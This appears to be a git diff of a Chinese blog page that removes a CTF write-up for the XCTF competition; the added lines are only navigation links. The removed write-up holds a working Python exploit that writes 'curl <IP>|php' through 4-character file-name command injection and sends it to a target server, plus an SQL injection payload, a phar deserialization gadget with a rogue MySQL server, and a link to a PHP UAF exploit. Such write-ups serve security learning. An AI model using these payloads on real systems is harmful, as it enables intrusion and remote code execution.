-    # 假设pos0选择 f , 创建名为 f&gt; 的文件
-
-    &#39;&gt;%st-&#39; % pos1,
-    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
-    # 因为alphabetical序中t&gt;s
-
-    &#39;&gt;sl&#39;,
-    # 创建名为 &gt;sl 的文件；到此处有四个文件，
-    # ls 的结果会是：dir f&gt; kt- sl
-
-    &#39;*&gt;v&#39;,
-    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，
-    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl
-    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
-
-    &#39;&gt;rev&#39;,
-    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v
-
-    &#39;*v&gt;%s&#39; % pos2,
-    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
-    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f
-
-    # 续行分割 curl 0x11223344|php 并逆序写入
-    &#39;&gt;p&#39;,
-    &#39;&gt;ph\\&#39;,
-    &#39;&gt;\\|\\&#39;,
-    &#39;&gt;%s\\&#39; % ip[8:10],
-    &#39;&gt;%s\\&#39; % ip[6:8],
-    &#39;&gt;%s\\&#39; % ip[4:6],
-    &#39;&gt;%s\\&#39; % ip[2:4],
-    &#39;&gt;%s\\&#39; % ip[0:2],
-    &#39;&gt;\\ \\&#39;,
-    &#39;&gt;rl\\&#39;,
-    &#39;&gt;cu\\&#39;,
-
-    &#39;sh &#39; + pos2,
-    &#39;sh &#39; + pos0,
-]
-burp0_url = &quot;http://121.36.222.22:88/core/index.php&quot;
-burp0_cookies = {&quot;PHPSESSID&quot;: &quot;d0669b0c49bf308022c430b52699b257&quot;, &quot;JSESSIONID&quot;: &quot;E1715942F5CF2C337F1B86D0B6F324E0&quot;}
-burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://121.36.222.22:88&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://121.36.222.22:88/core/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-for i in payload:
-    assert len(i) &lt;= 4
-    burp0_data = {&quot;url&quot;: &quot;compress.zlib://data:@127.0.0.1/plain;base64,&quot;+str(base64.b64encode(bytes(i,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)}
-    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
-    print(r.status_code,burp0_data,i)
-    print(r.text)
-    time.sleep(0.1)
-
-</code></pre>
-<p><code>flag{B11e_oX4461_Y2h1_100_OIZW4===}</code></p>
-<h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><p>最简单的题目之一</p>
-<p>payload:<code>&#39;-&#39;0</code></p>
-<h3 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h3><p><a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php</a><br>直接include就可以了,但是有时候可以,有时候不可以<br><img src="https://i.loli.net/2020/03/08/Cd7RqZwApre2Lxo.png" alt="image16793"></p>
-<p>flag{SObARsac1TyC0V9B}</p>
-<h3 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h3><p><a href="http://www.zip获得源码" target="_blank" rel="noopener">www.zip获得源码</a></p>
-<p>利用mysql load data 来 反序列化</p>
-<pre><code class="php">
-$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀
-$phar-&gt;startBuffering();
-$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
-$o = new Fileupload(new Listfile(&quot;/;/readflag;&quot;));
-$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
-$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
-//签名自动计算
-$phar-&gt;stopBuffering();
-</code></pre>
-<p><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p>
-<p>刚开始的时候本地成功打通,但是靶机那里怎么也打不通</p>
-<p>自己弄了个7.3.15的环境后发现</p>
-<p><img src="https://i.loli.net/2020/03/09/9bRVz63Ym7LDNxr.png" alt="image17357"><br>option那里要数字不要字符串<br>MYSQLI_OPT_LOCAL_INFILE对应的数字是8</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/10/xctf高校抗疫/">http://blog.ccreater.top/2020/03/10/xctf高校抗疫/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/" data-id="cka3ckr3l004cv4v0603g7bv9" data-title="xctf高校抗疫" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2901,6 +2428,10 @@ $phar-&gt;stopBuffering();
       <ul>
         
           <li>
+            <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/15/Service%20Worker/">Service Worker</a>
           </li>
         
@@ -2914,10 +2445,6 @@ $phar-&gt;stopBuffering();
         
           <li>
             <a href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21反序列化复现</a>
-          </li>
-        
-          <li>
-            <a href="/2020/09/21/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
           </li>
         
       </ul>
